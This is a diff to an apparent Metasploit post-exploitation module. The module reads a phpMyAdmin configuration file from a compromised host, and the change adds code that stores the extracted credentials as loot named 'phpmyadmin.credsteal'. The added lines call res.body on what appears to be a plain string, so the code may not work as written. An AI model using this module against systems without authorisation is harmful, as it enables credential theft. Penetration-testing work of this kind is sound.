@@ -53,5 +53,15 @@ class MetasploitModule < Msf::Post
     print_good("Extracting config file!\n")
     res = read_file(conf_path)
     print_line res
+    
+    vprint_good("#{peer} - #{res.body}")
+    path = store_loot(
+      'phpmyadmin.credsteal',
+      'text/plain',
+      ip,
+      res.body,
+      filename
+    )
+    print_good("File saved in: #{path}")
   end
 end
